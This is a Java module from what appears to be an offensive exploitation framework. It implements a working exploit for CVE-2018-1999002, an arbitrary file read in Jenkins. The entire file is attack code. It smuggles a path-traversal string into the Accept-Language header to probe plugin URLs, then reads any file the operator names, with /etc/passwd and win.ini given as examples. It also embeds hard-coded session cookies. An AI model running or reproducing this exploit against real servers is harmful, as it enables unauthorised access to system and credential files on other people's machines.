package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Jenkins_Info;
import fun.fireline.tools.Response;

import java.util.HashMap;

public class CVE_2018_1999002 implements ExploitInterface {

    private String url = "";

    private boolean isVul = false;

    private HashMap<String,String> headers = new HashMap<>();

    private String[] pluginList = {"credentials","jquery-detached","git","blueocean","jira","github"};

    private String use_plugin = "";

    private Jenkins_Info jenkins_info = new Jenkins_Info();

    @Override
    public String checkVul(String url) {
        this.url = url;
        String version = jenkins_info.get_Jenkions_Info(url);
        if(version==null){
            return "[-] 目标非Jenkins";
        }
        this.headers.put("Host", url.replace("http://","").replace("https://","").replace("/",""));
        this.headers.put("Accept", "text/javascript, text/html, application/xml, text/xml, */*");
        this.headers.put("X-Prototype-Version", "1.7");
        this.headers.put("DNT", "1");
        this.headers.put("X-Requested-With", "XMLHttpRequest");
        this.headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36");
        this.headers.put("Origin", url);
        this.headers.put("Referer", url);
        this.headers.put("Accept-Encoding", "gzip, deflate");
        this.headers.put("Accept-Language", "/../../../../../../../../windows/win");
        this.headers.put("Cookie", "JSESSIONID.450017e3=x6kdpnkcgllh18wvlaohsqq8z; screenResolution=1920x1080; JSESSIONID.ccf0cd96=node09crp5bs5eglyrv874no3w48l0.node0; JSESSIONID.6551b177=14vcq2nsop6bw1u8urepj65kwv; td_cookie=1608956971");
        this.headers.put("Connection", "close");
        for(String plugin:this.pluginList) {
            Response response = HttpTools.get(url + "/plugin/"+plugin+"/.ini", this.headers, "UTF-8");
            if (response.getCode() == 200) {
                if (response.getText().contains("Window")) {
                    this.use_plugin = plugin;
                    this.isVul = true;
                    return "[+] 目标可能存在CVE-2018-1999002 Jenkins 任意文件读取漏洞,请从文件读取/命令执行模块输入文件名读取文件,eg: c:/windows/win.ini或/etc/passwd";
                }
            }
        }
        return "[-] 目标可能不存在CVE-2018-1999002 Jenkins 任意文件读取漏洞";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        this.headers.remove("Accept-Language");
        int dotIndex = cmd.lastIndexOf(".");
        String extension = cmd.substring(dotIndex);
        this.headers.put("Accept-Language", "/../../../../../../../../"+cmd.substring(0,dotIndex));
        Response response = HttpTools.get(url+"/plugin/"+this.use_plugin+"/"+extension,this.headers,"UTF-8");
        if(response.getCode()==200){
            return "读取"+cmd+"内容:\n"+response.getText();
        }else {
            return "读取"+cmd+"内容失败";
        }
    }


    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
